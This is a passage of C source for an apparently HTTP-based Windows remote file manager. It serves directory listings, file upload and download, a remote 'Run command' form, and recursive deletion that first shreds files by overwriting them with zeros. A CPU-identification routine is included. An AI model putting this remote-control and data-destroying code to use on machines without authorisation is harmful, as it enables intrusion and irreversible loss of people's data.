        return( ERR_SEND_FAILED );

    if( GetFileAttributes( buf[2] + 8 ) & FILE_ATTRIBUTE_DIRECTORY )
    {
        retval = recursive_del( client_fd, buf );
        RemoveDirectory( buf[2] + 8 );
    }
    else
    {
        sprintf( buf[0], "  Erasing %s, please wait...\r\n",
                 buf[2] + 8 );

        if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                               (int) strlen( buf[0] ) )
            return( ERR_SEND_FAILED );

        retval = file_shredder( client_fd, buf );
        DeleteFile( buf[2] + 8 );
    }

    /* remove the last component from the url */

    for( i = strlen( buf[1] ) - 1; i > 0; i-- )
    {
        if( buf[1][i] == '/' )
        {
            buf[1][i] = '\0';
            break;
        }
    }

    /* reload the previous page */

    sprintf( buf[0], "<SCRIPT TYPE=\"text/javascript\">self.location.repla"
                     "ce('/_LIST?d=%s');</SCRIPT>\r\n</PRE>\r\n</BODY>\r\n"
                     "</HTML>\r\n", buf[1] + 8 );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    return( retval );
}

int file_shredder( int client_fd, char buf[3][2048] )
{
    int file_fd;
    __int64 file_size, off = 0;

   /* check that the requested file can be opened */

    if( ( file_fd = _open( buf[2] + 8, _O_RDWR | _O_BINARY, 0 ) ) < 0 )
        return( ERR_OPEN_FAILED );

    /* file successfully opened, now destroy the data */

    file_size = _lseeki64( file_fd, 0, SEEK_END );
    _lseeki64( file_fd, 0, SEEK_SET );

    memset( buf[0], 0, sizeof( buf[0] ) );

    while( off < file_size )
    {
        _write( file_fd, buf[0], sizeof( buf[0] ) );
        off += sizeof( buf[0] );
    }

    _close( file_fd );

    return( ERR_NO_ERROR );
}

int recursive_del( int client_fd, char buf[3][2048] )
{
    HANDLE hFind;
    WIN32_FIND_DATA wfd;
    int n;

    /* make sure we aren't trying to remove the root */

    if( strlen( buf[2] + 8 ) < 4 )
        return( ERR_SHIT_HAPPENS );

    sprintf( buf[0], "%s\\*.*", buf[2] + 8 );

    hFind = FindFirstFileA( buf[0], &wfd );

    if( hFind == INVALID_HANDLE_VALUE )
        return( ERR_FIND_FAILED );

    do
    {
        /* skip the current and upper directory */

        if( strcmp( wfd.cFileName, "."  ) == 0 ||
            strcmp( wfd.cFileName, ".." ) == 0 )
            continue;

        /* add the filename at the end of the pathname */

        n = strlen( buf[2] + 8 );

        if( n + strlen( wfd.cFileName ) >= sizeof( buf[2] ) - 9 )
            continue;

        buf[2][8 + n] = '\\';
        strcpy( &buf[2][8 + n + 1], wfd.cFileName );

        if( ( wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) != 0 )
        {
            /* dwelve into this directory */

            recursive_del( client_fd, buf );
            RemoveDirectory( buf[2] + 8 );
        }
        else
        {
            /* shred the file's contents */

            file_shredder( client_fd, buf );
            DeleteFile( buf[2] + 8 );
        }

        sprintf( buf[0], "<SCRIPT TYPE=\"text/javascript\">window.scrollBy"
                         "(0,40);</SCRIPT>  Removed  %s\r\n", buf[2] + 8 );
        send( client_fd, buf[0], strlen( buf[0] ), 0 );

        buf[2][8 + n] = 0;
    }
    while( FindNextFileA( hFind, &wfd ) != 0 );

    FindClose( hFind );

    return( ERR_NO_ERROR );
}

int list_files( int client_fd, char buf[3][2048] )
{
    int i;
    char tmpstr[256];

    HANDLE hFind;
    WIN32_FIND_DATA wfd;
    SYSTEMTIME st;

    sprintf( buf[0], HTTP_HEADERS );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    /* some actions on the current directory */

    sprintf( buf[0], "<FORM ACTION=\"/_UPLD?d=%s\" METHOD=\"POST\" ENCTYPE"
                     "=\"multipart/form-data\">  <INPUT TYPE=\"file\" NAME"
                     "=\"x\"><INPUT TYPE=\"submit\" VALUE=\"Upload file\">"
                     "</FORM>"
                     "<!--<FORM ACTION=\"/_UZIP\" METHOD=\"POST\" ENCTYPE="
                     "\"multipart/form-data\"><INPUT TYPE=\"file\" NAME=\""
                     "n\"><INPUT TYPE=\"submit\" VALUE=\"Unpack zip\"></FO"
                     "RM>-->"
                     "<FORM ACTION=\"/_EXEC\" METHOD=\"GET\">  <INPUT TYPE"
                     "=\"text\" SIZE=\"31\" NAME=\"c\"><INPUT TYPE=\"hidde"
                     "n\" NAME=\"d\" VALUE=\"%s\"><INPUT TYPE=\"submit\" V"
                     "ALUE=\"Run command\"></FORM>\r\n",
                     buf[1] + 8, buf[1] + 8 );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    /* first display the directories */

    sprintf( buf[0], "%s\\*.*", buf[2] + 8 );

    hFind = FindFirstFileA( buf[0], &wfd );

    if( hFind == INVALID_HANDLE_VALUE )
        return( ERR_FIND_FAILED );

    if( strlen( buf[1] + 8 ) < 4 )
    {
        /* link to start page */

        sprintf( buf[0], "    <A HREF=\"/\">%-75s</A>\r\n\r\n",
                 "Parent directory" );
    }
    else
    {
        /* link to upper directory */

        for( i = strlen( buf[1] ) - 1; i > 0; i-- )
        {
            if( buf[1][i] == '/' )
            {
                buf[1][i] = '\0';
                break;
            }
        }

        sprintf( buf[0], "    <A HREF=\"/%s\">%-75s</A>\r\n\r\n",
                 buf[1], "Parent directory" );

        buf[1][i] = '/';
    }

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    do
    {
        if( ! ( wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) )
            continue;

        if( strcmp( wfd.cFileName, "."  ) == 0 ||
            strcmp( wfd.cFileName, ".." ) == 0 )
            continue;

        memset( tmpstr, 0, sizeof( tmpstr ) );
        memcpy( tmpstr, wfd.cFileName, sizeof( tmpstr ) - 1 );

        if( tmpstr[75] != 0 )
        {
            tmpstr[72] = '.'; tmpstr[73] = '.';
            tmpstr[74] = '.'; tmpstr[75] = 0;
        }

        sprintf( buf[0], "<!--<A onClick=\"return confirm('Donwload dir. in zi"
                         "p format ?');\" HREF=\"/_ZIPD?d=%s/%s\">D</A>-->  <A"
                         " onClick=\"return confirm('Delete the whole dire"
                         "ctory ? ');\" HREF=\"/_DELE?p=%s/%s\">x</A> <A H"
                         "REF=\"/_LIST?d=%s/%s\">%-75s</A>\r\n",
                         buf[1] + 8, wfd.cFileName,
                         buf[1] + 8, wfd.cFileName,
                         buf[1] + 8, wfd.cFileName, tmpstr );

        if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                               (int) strlen( buf[0] ) )
            return( ERR_SEND_FAILED );
    }
    while( FindNextFileA( hFind, &wfd ) != 0 );

    FindClose( hFind );

    /* now list the regular files */

    sprintf( buf[0], "%s\\*.*", buf[2] + 8 );

    hFind = FindFirstFileA( buf[0], &wfd );

    if( hFind == INVALID_HANDLE_VALUE )
        return( ERR_FIND_FAILED );

    do
    {
        if( ( wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) != 0 )
            continue;

        memset( tmpstr, 0, sizeof( tmpstr ) );
        memcpy( tmpstr, wfd.cFileName, sizeof( tmpstr ) - 1 );

        if( tmpstr[46] != 0 )
        {
            tmpstr[43] = '.'; tmpstr[44] = '.';
            tmpstr[45] = '.'; tmpstr[46] = 0;
        }

        FileTimeToSystemTime( &wfd.ftLastWriteTime, &st );

        sprintf( buf[0], "  <A onClick=\"return confirm('Delete this file "
                         "?');\" HREF=\"/_DELE?p=%s/%s\">x</A> <A HREF=\"/"
                         "%s/%s\">%-46s</A> %10d  %04d-%02d-%02d %02d:%02d"
                         "\r\n",  buf[1] + 8, wfd.cFileName,
                                  buf[1] + 8, wfd.cFileName,
                                  tmpstr, wfd.nFileSizeLow,
                                  st.wYear, st.wMonth, st.wDay,
                                  st.wHour, st.wMinute );

        if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                               (int) strlen( buf[0] ) )
            return( ERR_SEND_FAILED );

    }
    while( FindNextFileA( hFind, &wfd ) != 0 );

    FindClose( hFind );

    sprintf( buf[0], "</PRE>\r\n</BODY>\r\n</HTML>\r\n" );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    return( ERR_NO_ERROR );
}

int download_file( int client_fd, char buf[3][2048] )
{
    int i, n;
    char *p, *e;
    FILE *f;

    /* check that the requested file can be opened */

    if( ( f = fopen( buf[2], "rb" ) ) == NULL )
    {
        sprintf( buf[0], "HTTP/1.0 200 OK\r\nContent-Type:"
                         " text/plain\r\n\r\n" );

        send( client_fd, buf[0], strlen( buf[0] ), 0 );

        return( ERR_OPEN_FAILED );
    }

    /* file successfully opened, now check the mime type */

    p = "application/x-download";

    memset( buf[0], 0, sizeof( buf[0] ) );
    memcpy( buf[0], buf[2], sizeof( buf[0] ) - 1 );

    n = strlen( buf[0] );

    for( i = n - 4; i < n; i++ )
    {
        /* convert file extension to lowercase */

        if( i < 0 ) continue;
        if( buf[0][i] >= 'A' && buf[0][i] <= 'Z' )
            buf[0][i] += 32;
    }

    e = buf[0] + n;

    /* so ugly */

    if( ! strcmp( e - 2, ".c"    ) ) p = "text/plain";
    if( ! strcmp( e - 3, ".cc"   ) ) p = "text/plain";
    if( ! strcmp( e - 4, ".cpp"  ) ) p = "text/plain";
    if( ! strcmp( e - 2, ".h"    ) ) p = "text/plain";
    if( ! strcmp( e - 4, ".txt"  ) ) p = "text/plain";
    if( ! strcmp( e - 4, ".ini"  ) ) p = "text/plain";
    if( ! strcmp( e - 4, ".nfo"  ) ) p = "text/plain";
    if( ! strcmp( e - 4, ".log"  ) ) p = "text/plain";
    if( ! strcmp( e - 4, ".css"  ) ) p = "text/plain";
    if( ! strcmp( e - 3, ".js"   ) ) p = "text/plain";
    if( ! strcmp( e - 4, ".vbs"  ) ) p = "text/plain";
    if( ! strcmp( e - 4, ".htm"  ) ) p = "text/html";
    if( ! strcmp( e - 5, ".html" ) ) p = "text/html";
    if( ! strcmp( e - 4, ".wav"  ) ) p = "audio/x-wav";
    if( ! strcmp( e - 4, ".wma"  ) ) p = "audio/x-ms-wma";
    if( ! strcmp( e - 4, ".mp3"  ) ) p = "audio/mpeg";
    if( ! strcmp( e - 4, ".mp4"  ) ) p = "video/mp4";
    if( ! strcmp( e - 4, ".mpe"  ) ) p = "video/mpeg";
    if( ! strcmp( e - 4, ".mpg"  ) ) p = "video/mpeg";
    if( ! strcmp( e - 5, ".mpeg" ) ) p = "video/mpeg";
    if( ! strcmp( e - 3, ".qt"   ) ) p = "video/quicktime";
    if( ! strcmp( e - 4, ".mov"  ) ) p = "video/quicktime";
    if( ! strcmp( e - 4, ".wmv"  ) ) p = "video/x-ms-wmv";
    if( ! strcmp( e - 4, ".avi"  ) ) p = "video/x-msvideo";
    if( ! strcmp( e - 3, ".gz"   ) ) p = "application/gzip";
    if( ! strcmp( e - 4, ".tar"  ) ) p = "application/x-tar";
    if( ! strcmp( e - 4, ".tgz"  ) ) p = "application/x-gtar";
    if( ! strcmp( e - 4, ".rar"  ) ) p = "application/rar";
    if( ! strcmp( e - 4, ".zip"  ) ) p = "application/zip";
    if( ! strcmp( e - 4, ".pdf"  ) ) p = "application/pdf";
    if( ! strcmp( e - 4, ".hlp"  ) ) p = "application/mshelp";
    if( ! strcmp( e - 4, ".chm"  ) ) p = "application/mshelp";
    if( ! strcmp( e - 4, ".doc"  ) ) p = "application/msword";
    if( ! strcmp( e - 4, ".xls"  ) ) p = "application/msexcel";
    if( ! strcmp( e - 4, ".ppt"  ) ) p = "application/mspowerpoint";
    if( ! strcmp( e - 4, ".bmp"  ) ) p = "image/x-ms-bmp";
    if( ! strcmp( e - 4, ".gif"  ) ) p = "image/gif";
    if( ! strcmp( e - 4, ".png"  ) ) p = "image/png";
    if( ! strcmp( e - 4, ".jpg"  ) ) p = "image/jpeg";
    if( ! strcmp( e - 5, ".jpeg" ) ) p = "image/jpeg";

    sprintf( buf[0], "HTTP/1.1 200 OK\r\nContent-Type:"
                     " %s;\r\nConnection: close\r\n\r\n", p );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    while( ( n = fread( buf[0], 1, sizeof( buf[0] ), f ) ) > 0 )
        if( send( client_fd, buf[0], n, 0 ) != n )
            return( ERR_SEND_FAILED );

    fclose( f );

    return( ERR_NO_ERROR );
}

int upload_file( int client_fd, char buf[3][2048], int length )
{
    int i;
    FILE *f;
    char *p, *q;
    char boundary[128];
    char pathname[2048];

    if( ! strstr( buf[0], "Content-" ) )
    {
        /* Mozilla doesn't send the full headers at once */

        memset( buf[0], 0, sizeof( buf[0] ) );

        length = recv( client_fd, buf[0], sizeof( buf[0] ) - 1, 0 );

        if( length <= 0 )
            return( ERR_RECV_FAILED );
    }

    p = strstr( buf[0], "boundary=" );
    q = strstr( p, "\r\n" );

    if( p == NULL || q == NULL || q - p > 100 )
        return( ERR_SHIT_HAPPENS );

    *q = '\0';
    memset( boundary, 0, sizeof( boundary ) );
    strcpy( boundary + 4, p + 9 );
    boundary[0] = '\r';
    boundary[1] = '\n';
    boundary[2] =  '-';
    boundary[3] =  '-';
    *q = '\r';

    p = strstr( buf[0], "\r\n\r\n" );
    if( p == NULL )
        return( ERR_SHIT_HAPPENS );
    p += 4;

    /* locate the filename & create it */

    if( ! ( q = strstr( p, "filename=\"" ) ) )
        return( ERR_FORM_ERROR );

    if( ! ( q = strstr( q, "\r\n" ) ) )
        return( ERR_FORM_ERROR );

    q[i = -1] = 0;
    while( q[i] != '"' && q[i] != '/' && q[i] != '\\' ) i--;
    i++;

    if( strlen( q + i ) > 256 || strlen( buf[2] + 8 ) > 1024 )
        return( ERR_FORM_ERROR );

    sprintf( pathname, "%s\\%s", buf[2] + 8, q + i );

    if( ( f = fopen( pathname, "wb+" ) ) == NULL )
        return( ERR_CREAT_FAILED );

    /* skip to the start of the stream */

    q[-1] = ' ';
    if( ! ( q = strstr( p, "\r\n\r\n" ) )) 
        return( ERR_FORM_ERROR );

    q += 4;
    length = buf[0] + length - q;

    while( 1 )
    {
        int n = length, m = strlen( boundary );

        for( i = 0; i < length - m; i++ )
        {
            if( ! memcmp( q + i, boundary, m - 1 ) )
            {
                n = i;
                break;
            }
        }

        fwrite( q, 1, n, f );
        if( n < length ) break;

        length = recv( client_fd, buf[0], sizeof( buf[0] ), 0 );
        if( length <= 0 ) break;

        q = buf[0];
    }

    fclose( f );

    /* reload the previous page */

    sprintf( buf[0], "HTTP/1.0 200 OK\r\nContent-Type: text/html\r\n\r\n<S"
                     "CRIPT TYPE=\"text/javascript\">self.location.replace"
                     "('/_LIST?d=%s');</SCRIPT>Done.", buf[1] + 8 );

    if( send( client_fd, buf[0], strlen( buf[0] ), 0 ) !=
                           (int) strlen( buf[0] ) )
        return( ERR_SEND_FAILED );

    return( ERR_NO_ERROR );
}

void GetCPUInfo( char *buffer )
{
    HKEY hdsc0;
    __int64 tsc1, tsc2;
    DWORD kType, kSize, speed;
    DWORD speed2, tick_start;

    char vendor[13], *p;
    int cpuver, flags1, flags2;
    int stepping, model, family;
    int model_ext, family_ext;

    /* get the CPU speed from the registry */

    speed = 0;

    if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\"
                      "System\\CentralProcessor\\0", 0, KEY_READ,
                      &hdsc0 ) == ERROR_SUCCESS )
    {
        kSize = sizeof( speed );

        RegQueryValueEx( hdsc0, "~MHz", NULL, &kType,
                         (unsigned char *) &speed, &kSize );

        RegCloseKey( hdsc0 );
    }

    _asm
    {
        rdtsc
	mov dword ptr [tsc1 + 0], eax
	mov dword ptr [tsc1 + 4], edx
    }

    tick_start  = GetTickCount();
    do { } while( GetTickCount() - tick_start < 1000 );

    _asm
    {
        rdtsc
	mov dword ptr [tsc2 + 0], eax
	mov dword ptr [tsc2 + 4], edx
    }

    speed2 = (unsigned long) ((tsc2 - tsc1) / 1000000);

    /* get the CPU vendor and signature */

    vendor[12] = 0;

    _asm
    {
        push ecx
        push edx
        push ebx

        xor eax, eax
        cpuid
        mov dword ptr [vendor + 0], ebx
        mov dword ptr [vendor + 4], edx
        mov dword ptr [vendor + 8], ecx

        xor eax, eax
        inc eax
        cpuid
        mov cpuver, eax
        mov flags1, edx
        mov flags2, ecx

        pop ebx
        pop edx
        pop ecx
    }

    stepping    = ( cpuver & 0x0000000F );
    model       = ( cpuver & 0x000000F0 ) >>  4;
    family      = ( cpuver & 0x00000F00 ) >>  8;
    model_ext   = ( cpuver & 0x000F0000 ) >> 16;
    family_ext  = ( cpuver & 0x0FF00000 ) >> 20;

    p = vendor;

    if( strcmp( vendor, "GenuineIntel" ) == 0 )
    {
        p = "Intel (Unknown)";

        switch( family )
        {
        case  4:
        {
            switch( model )
            {
            case  0: p = "Intel 486 DX-25/33"; break;
            case  1: p = "Intel 486 DX-50"; break;
            case  2: p = "Intel 486 SX"; break;
            case  3: p = "Intel 486 DX/2"; break;
	    case  4: p = "Intel 486 SL"; break;
            case  5: p = "Intel 486 SX/2"; break;
            case  7: p = "Intel 486 DX/2-WB"; break;
            case  8: p = "Intel 486 DX/4"; break;
            case  9: p = "Intel 486 DX/4-WB"; break;
            default: p = "Intel 486 ?"; break;
            }
            break;
        }
        case  5:
        {
            switch( model )
            {
            case  0: p = "Intel Pentium 60/66 A-step"; break;
            case  1: p = "Intel Pentium 60/66"; break;
            case  2: p = "Intel Pentium 75 - 200"; break;
            case  3: p = "Intel OverDrive PODP5V83"; break;
            case  4: p = "Intel Pentium MMX"; break;
            case  7: p = "Intel Mobile Pentium 75 - 200"; break;
            case  8: p = "Intel Mobile Pentium MMX"; break;
            default: p = "Intel Pentium I ?"; break;
            }
            break;
        }
        case  6:
        {
            switch( model )
            {
            case  0: p = "Intel Pentium Pro A-step"; break;
            case  1: p = "Intel Pentium Pro"; break;
            case  3: p = "Intel Pentium II (Klamath)"; break;
            case  5: p = "Intel PII (Deschutes / Xeon)"; break;
            case  6: p = "Intel PII / Celeron A (Mendocino)"; break;
            case  7: p = "Intel Pentium III (Katmai)"; break;
            case  8: p = "Intel Pentium III (Coppermine)"; break;
            case  9: p = "Intel Pentium Mobile (0.13�m)"; break;
            case 10: p = "Intel Pentium III Xeon (Cascades)"; break;
            case 11: p = "Intel Pentium III Xeon (Tualatin)"; break;
            case 13: p = "Intel Pentium Mobile (0.09�m)"; break;
            default: p = "Intel Pentium II/III ?"; break;
            }
            break;
        }
        case  7:

            p = "Intel Itanium 1 (IA-64)";
            break;

        case 15:

            switch( family_ext )
            {
            case 0:

                switch( model )
                {
                case  0:
                case  1: p = "Intel Pentium IV (0.18�m)"; break;
                case  2: p = "Intel Pentium IV (0.13�m)"; break;
                case  3:
                case  4: p = "Intel Pentium IV (0.09�m)"; break;
                default: p = "Intel Pentium IV"; break;
                }
                break;

            case 1:

                p = "Intel Itanium 2 (IA-64)";
                break;
            }
            break;
        }
    }

    if( strcmp( vendor, "AuthenticAMD" ) == 0 )
    {
        p = "AMD (Unknown)";

        switch( family )
        {
        case  4:

            switch( model )
            {
            case  3: p = "AMD 486 DX/2"; break;
            case  7: p = "AMD 486 DX/2-WB"; break;
            case  8: p = "AMD 486 DX/4"; break;
            case  9: p = "AMD 486 DX/4-WB"; break;
            case 14: p = "AMD Am5x86-WT"; break;
            case 15: p = "AMD Am5x86-WB"; break;
            default: p = "AMD 486/586 ?"; break;
            }
            break;

        case  5:

            switch( model )
            {
            case  0: p = "AMD K5/SSA5"; break;
            case  1:
            case  2:
            case  3: p = "AMD K5"; break;
            case  6: p = "AMD K6 (0.30�m)"; break;
            case  7: p = "AMD K6 (0.25�m)"; break;
            case  8: p = "AMD K6-2"; break;
            case  9: p = "AMD K6-3"; break;
            case 13: p = "AMD K6-2/3+ (0.18�m)"; break;
            default: p = "AMD K5/K6 ?"; break;
            }
            break;

        case  6:

            switch( model )
            {
            case  0:
            case  1: p = "AMD Athlon (0.25�m)"; break;
            case  2: p = "AMD Athlon (0.18�m)"; break;
            case  3: p = "AMD Duron"; break;
            case  4: p = "AMD Athlon (Thunderbird)"; break;
            case  6: p = "AMD Athlon XP (Palamino)"; break;
            case  7: p = "AMD Duron (Morgan)"; break;
            case  8: p = "AMD Athlon XP (Thoroughbred)"; break;
            case 10: p = "AMD Athlon XP (Barton)"; break;
            default: p = "AMD Athlon XP ?"; break;
            }
            break;

        case 15:

            switch( family_ext )
            {
            case  0:

                switch( model )
                {
                case  5: p = "AMD Opteron"; break;
                default: p = "AMD Athlon 64"; break;
                }
                break;
            }
            break;
        }
    }

    if( strcmp( vendor, "CyrixInstead" ) == 0 ) p = "Cyrix";
    if( strcmp( vendor, "CentaurHauls" ) == 0 ) p = "Centaur";
    if( strcmp( vendor, "NexGenDriven" ) == 0 ) p = "NexGen";
    if( strcmp( vendor, "GenuineTMx86" ) == 0 ) p = "Transmeta";
    if( strcmp( vendor, "RiseRiseRise" ) == 0 ) p = "Rise";
    if( strcmp( vendor, "UMC UMC UMC " ) == 0 ) p = "UMC";
    if( strcmp( vendor, "SiS SiS SiS " ) == 0 ) p = "SiS";
    if( strcmp( vendor, "Geode by NSC" ) == 0 ) p = "NSC";

    sprintf( buffer, "%s @ %d MHz [ %s%s%s%s%s]",
             p, ( speed > speed2 ) ? speed : speed2,
             ( flags1 & 0x00800000 ) ? "MMX " : "",
             ( flags1 & 0x02000000 ) ? "SSE " : "",
             ( flags1 & 0x04000000 ) ? "SSE2 " : "",
             ( flags2 & 0x00000001 ) ? "SSE3 " : "",
             ( flags1 & 0x10000000 ) ? "HT " : "" );
}
